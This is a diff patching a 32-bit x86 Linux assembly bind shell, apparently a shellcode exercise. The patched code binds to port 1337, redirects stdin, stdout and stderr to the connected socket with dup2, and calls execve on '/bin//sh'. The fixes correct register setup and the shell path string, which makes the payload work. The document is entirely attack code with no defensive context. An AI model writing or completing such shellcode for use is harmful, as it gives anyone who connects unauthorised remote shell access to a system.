@@ -36,6 +36,7 @@ main:
 
     ; int socketcall(int call, unsigned long *args);
     ;bind(sockfd,(struct sockaddr*)&server,sizeof(server));
+    xor eax,eax
     push esi
     push word 0x3905;1337 port in hex and reverse
     push word 2
@@ -46,6 +47,8 @@ main:
     push ecx
     push edx
     mov  ecx,esp
+    mov al,102
+    mov bl,2
 
     int 0x80    ; bind()
 
@@ -80,8 +83,8 @@ main:
     xor eax,eax
 
 	mov al, 63		; syscall 63 - dup2
-	mov ebx, edx		; oldfd (client socket fd)
-;	mov ecx, 0		; stdin file descriptor
+	mov ebx, edi		; oldfd (client socket fd)
+	mov cl, 0	; stdin file descriptor
 
 	int 0x80		; kernel interruption
 
@@ -91,18 +94,20 @@ main:
     int 0x80
 
     mov al, 63
-    mov cl, 2		; stderr file descriptor
+    mov cl,2		; stderr file descriptor
 
     int 0x80
 
+
     ; now execve("////bin/bash",NULL,NULL)
     xor eax,eax
+    xor esi,esi
     mov al,0xb
  
     ;2f 2f 2f 2f 62 69 6e 2f 62 61 73 68 
-    push 0x68736162
-    push 0x2f636962
-    push 0x2f2f2f2f
+    push esi
+    push 0x68732f2f		; "//sh"
+	push 0x6e69622f     ; "/bin"
     mov ebx,esp 
     mov ecx,esi
     mov edx,esi 
